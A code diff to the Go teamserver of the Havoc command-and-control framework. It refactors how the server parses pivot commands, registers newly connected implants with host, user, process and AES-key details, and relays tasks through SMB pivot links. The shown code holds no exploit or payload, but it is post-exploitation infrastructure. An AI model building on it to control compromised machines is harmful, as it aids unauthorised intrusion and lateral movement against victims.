@@ -1,6 +1,14 @@
 package demons
 
 import (
+    "Havoc/pkg/colors"
+    "Havoc/pkg/common"
+    "Havoc/pkg/common/crypt"
+    "Havoc/pkg/common/parser"
+    "Havoc/pkg/logger"
+    "Havoc/pkg/logr"
+    "Havoc/pkg/utils"
+    "Havoc/pkg/win32"
     "bytes"
     "encoding/base64"
     "encoding/binary"
@@ -13,14 +21,6 @@ import (
     "strings"
     "time"
 
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/colors"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/common"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/common/crypt"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/common/parser"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/logger"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/logr"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/utils"
-    "github.com/Cracked5pider/Havoc/teamserver/pkg/win32"
     "github.com/fatih/structs"
     "github.com/olekukonko/tablewriter"
 )
@@ -1420,9 +1420,24 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 
     case COMMAND_PIVOT:
         var (
-            PivotCommand, _ = strconv.Atoi(Optional["Command"].(string))
-            Param           = Optional["Param"].(string)
+            PivotCommand int
+            Param        string
         )
+
+        if val, ok := Optional["Param"]; ok {
+            Param = val.(string)
+        }
+
+        if val, ok := Optional["Command"]; ok {
+
+            if val, err := strconv.Atoi(val.(string)); err != nil {
+                logger.Debug("failed to convert pivot command to int: " + err.Error())
+                return DemonJob{}, errors.New("failed to convert pivot command to int: " + err.Error())
+            } else {
+                PivotCommand = val
+            }
+
+        }
 
         switch PivotCommand {
         case DEMON_PIVOT_LIST:
@@ -1435,6 +1450,7 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
                 PivotCommand,
                 Param,
             }
+
             break
 
         case DEMON_PIVOT_SMB_DISCONNECT:
@@ -1462,17 +1478,17 @@ func TaskPrepare(TaskID string, Command int, Info any) (DemonJob, error) {
 func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs RoutineFunc) {
     Parser.DecryptBuffer(demon.Encryption.AESKey, demon.Encryption.AESIv)
 
-    logger.Debug("\n" + hex.Dump(demon.Encryption.AESKey))
-
-    // Callback
     {
-        Message := make(map[string]string)
         demon.UpdateLastCallback()
+        Message := make(map[string]string)
         Message["Output"] = demon.Info.LastCallIn
         Funcs.DemonOutput(demon.NameID, COMMAND_NOJOB, Message)
     }
 
     switch CommandID {
+
+    case COMMAND_GET_JOB:
+        break
 
     case COMMAND_EXIT:
         if Parser.Length() >= 4 {
@@ -1500,21 +1516,21 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 
         if Parser.Length() > 0 {
             var (
-                MagicValue      int
-                DemonID         int
-                Hostname        string
-                DomainName      string
-                Username        string
-                InternalIP      string
-                ProcessName     string
-                ProcessPID      int
-                OsVersion       []int
-                OsArch          int
-                Elevated        int
-                ProcessArch     int
-                ProcessPPID     int
-                SleepDelay      int
-                Session         = &Agent{
+                MagicValue  int
+                DemonID     int
+                Hostname    string
+                DomainName  string
+                Username    string
+                InternalIP  string
+                ProcessName string
+                ProcessPID  int
+                OsVersion   []int
+                OsArch      int
+                Elevated    int
+                ProcessArch int
+                ProcessPPID int
+                SleepDelay  int
+                Session     = &Agent{
                     Encryption: struct {
                         AESKey []byte
                         AESIv  []byte
@@ -1566,25 +1582,25 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
             }
 
             ProcessName = string(Parser.ParseBytes())
-            ProcessPID  = Parser.ParseInt32()
+            ProcessPID = Parser.ParseInt32()
             ProcessPPID = Parser.ParseInt32()
             ProcessArch = Parser.ParseInt32()
-            Elevated    = Parser.ParseInt32()
-            OsVersion   = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
-            OsArch      = Parser.ParseInt32()
-            SleepDelay  = Parser.ParseInt32()
+            Elevated = Parser.ParseInt32()
+            OsVersion = []int{Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32(), Parser.ParseInt32()}
+            OsArch = Parser.ParseInt32()
+            SleepDelay = Parser.ParseInt32()
 
             Session.Active = true
 
-            Session.NameID           = fmt.Sprintf("%x", DemonID)
-            Session.Info.MagicValue  = MagicValue
+            Session.NameID = fmt.Sprintf("%x", DemonID)
+            Session.Info.MagicValue = MagicValue
             Session.Info.FirstCallIn = time.Now().Format("02-01-2006 15:04:05")
-            Session.Info.LastCallIn  = time.Now().Format("02-01-2006 15:04:05.999")
-            Session.Info.Hostname    = Hostname
-            Session.Info.DomainName  = DomainName
-            Session.Info.Username    = Username
-            Session.Info.InternalIP  = InternalIP
-            Session.Info.SleepDelay  = SleepDelay
+            Session.Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
+            Session.Info.Hostname = Hostname
+            Session.Info.DomainName = DomainName
+            Session.Info.Username = Username
+            Session.Info.InternalIP = InternalIP
+            Session.Info.SleepDelay = SleepDelay
 
             // Session.Info.ExternalIP 	= strings.Split(connection.RemoteAddr().String(), ":")[0]
             // Session.Info.Listener 	= t.Name
@@ -1673,37 +1689,37 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
 
             Message["Output"] = fmt.Sprintf(
                 "\n"+
-                "Teamserver:\n"+
-                "  - Session Path       : %v\n"+
-                "\n"+
-                "Meta Data:\n"+
-                "  - Agent ID           : %v\n"+
-                "  - Magic Value        : %x\n"+
-                "  - First Call In      : %v\n"+
-                "  - Last  Call In      : %v\n"+
-                "  - AES Key            : %v\n"+
-                "  - AES IV             : %v\n"+
-                "  - Sleep Delay        : %v\n"+
-                "\n"+
-                "Host Info:\n"+
-                "  - Host Name          : %v\n"+
-                "  - User Name          : %v\n"+
-                "  - Domain Name        : %v\n"+
-                "  - Internal IP        : %v\n"+
-                "\n"+
-                "Process Info:\n"+
-                "  - Process Name       : %v\n"+
-                "  - Process Arch       : %v\n"+
-                "  - Process ID         : %v\n"+
-                // "  - Process Parent ID  : %v\n" +
-                "  - Process Path       : %v\n"+
-                "  - Process Elevated   : %v\n"+
-                "\n"+
-                "Operating System:\n"+
-                "  - Version            : %v\n"+
-                "  - Build              : %v.%v.%v.%v.%v\n"+
-                "  - Arch               : %v\n"+
-                "",
+                    "Teamserver:\n"+
+                    "  - Session Path       : %v\n"+
+                    "\n"+
+                    "Meta Data:\n"+
+                    "  - Agent ID           : %v\n"+
+                    "  - Magic Value        : %x\n"+
+                    "  - First Call In      : %v\n"+
+                    "  - Last  Call In      : %v\n"+
+                    "  - AES Key            : %v\n"+
+                    "  - AES IV             : %v\n"+
+                    "  - Sleep Delay        : %v\n"+
+                    "\n"+
+                    "Host Info:\n"+
+                    "  - Host Name          : %v\n"+
+                    "  - User Name          : %v\n"+
+                    "  - Domain Name        : %v\n"+
+                    "  - Internal IP        : %v\n"+
+                    "\n"+
+                    "Process Info:\n"+
+                    "  - Process Name       : %v\n"+
+                    "  - Process Arch       : %v\n"+
+                    "  - Process ID         : %v\n"+
+                    // "  - Process Parent ID  : %v\n" +
+                    "  - Process Path       : %v\n"+
+                    "  - Process Elevated   : %v\n"+
+                    "\n"+
+                    "Operating System:\n"+
+                    "  - Version            : %v\n"+
+                    "  - Build              : %v.%v.%v.%v.%v\n"+
+                    "  - Arch               : %v\n"+
+                    "",
 
                 // Teamserver
                 Session.SessionDir,
@@ -3260,10 +3276,9 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
             var Success = Parser.ParseInt32()
 
             if Success == 1 {
-                // logger.Debug("DEMON_PIVOT_SMB_CONNECT: Success")
                 if Parser.Length() > 0 {
                     var DemonData = Parser.ParseBytes()
-                    // logger.Debug("DEMON_PIVOT_SMB_CONNECT: DemonData:\n" + hex.Dump(DemonData))
+
                     var AgentHdr, err = AgentParseHeader(DemonData)
                     if err == nil {
 
@@ -3333,6 +3348,7 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
             break
 
         case DEMON_PIVOT_SMB_COMMAND:
+
             if Parser.Length() > 0 {
                 var (
                     Package       = Parser.ParseBytes()
@@ -3340,38 +3356,22 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
                 )
 
                 if err == nil {
-                    logger.Debug("Test: \n" + hex.Dump(AgentHdr.Data.Buffer()))
 
                     if AgentHdr.MagicValue == DEMON_MAGIC_VALUE {
                         var Command = AgentHdr.Data.ParseInt32()
-                        logger.Debug(fmt.Sprintf("DEMON_PIVOT_SMB_COMMAND: Command => %d\n", Command))
-                        if Command == COMMAND_GET_JOB {
-                            logger.Debug("COMMAND_GET_JOB")
-                            for i := range demon.Pivots.Links {
-                                if demon.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
 
-                                    // Callback
-                                    demon.Pivots.Links[i].Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-                                    Message["Output"] = demon.Pivots.Links[i].Info.LastCallIn
-                                    Funcs.DemonOutput(demon.Pivots.Links[i].NameID, COMMAND_NOJOB, Message)
+                        found := false
+                        for i := range demon.Pivots.Links {
+                            if demon.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
+                                demon.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, Funcs)
+                                found = true
+                                break
+                            }
+                        }
 
-                                    return
-                                }
-                            }
-                        } else {
-                            logger.Debug("DEMON_PIVOT_SMB_COMMAND: Output callback")
-                            found := false
-                            for i := range demon.Pivots.Links {
-                                if demon.Pivots.Links[i].NameID == utils.IntToHexString(AgentHdr.AgentID) {
-                                    demon.Pivots.Links[i].TaskDispatch(Command, AgentHdr.Data, Funcs)
-                                    found = true
-                                    break
-                                }
-                            }
-                            if !found {
-                                Message["Type"] = "Error"
-                                Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
-                            }
+                        if !found {
+                            Message["Type"] = "Error"
+                            Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", AgentHdr.AgentID)
                         }
 
                     } else {
@@ -3382,53 +3382,8 @@ func (demon *Agent) TaskDispatch(CommandID int, Parser *parser.Parser, Funcs Rou
                     Message["Type"] = "Error"
                     Message["Message"] = "[SMB] Failed to parse agent header: " + err.Error()
                 }
-
-                /*
-                	// it's a heartbeat message.
-                	if PackageParser.Length() == 8 {
-                		_ 	  	= PackageParser.ParseInt32()
-                		DemonID = PackageParser.ParseInt32()
-
-                		// check if the pivot exists. if not then it's a weird request just ignore
-                		for i := range demon.Pivots.Links {
-                			if demon.Pivots.Links[i].NameID == utils.IntToHexString(DemonID) {
-
-                				// Callback
-                				demon.Pivots.Links[i].Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-                				Message["Output"] = demon.Pivots.Links[i].Info.LastCallIn
-                				Funcs.DemonOutput(demon.Pivots.Links[i].NameID, COMMAND_NOJOB, Message)
-
-                				return
-                			}
-                		}
-                		return
-
-                	// it's a command output
-                	} else if PackageParser.Length() > 8 {
-                		_ 	   	= PackageParser.ParseInt32()
-                		Value   = PackageParser.ParseInt32()
-                		DemonID	= PackageParser.ParseInt32()
-                	}
-
-                	found := false
-                	for i := range demon.Pivots.Links {
-                		if demon.Pivots.Links[i].NameID == utils.IntToHexString(DemonID) {
-                			found = true
-                			demon.Pivots.Links[i].TaskDispatch(Value, PackageParser, Funcs)
-
-                			// demon.Pivots.Links[i].Info.LastCallIn = time.Now().Format("02-01-2006 15:04:05.999")
-                			// Message["Output"] = demon.Info.LastCallIn
-                			// Funcs.DemonOutput(demon.Pivots.Links[i].NameID, COMMAND_NOJOB, Message)
-
-                			break
-                		}
-                	}
-
-                	if ! found {
-                		Message["Type"] = "Error"
-                		Message["Message"] = fmt.Sprintf("Can't process output for %x: Agent not found", utils.HexIntToString(utils.HexIntToBigEndian(DemonID)))
-                	}*/
             }
+
             break
 
         default:
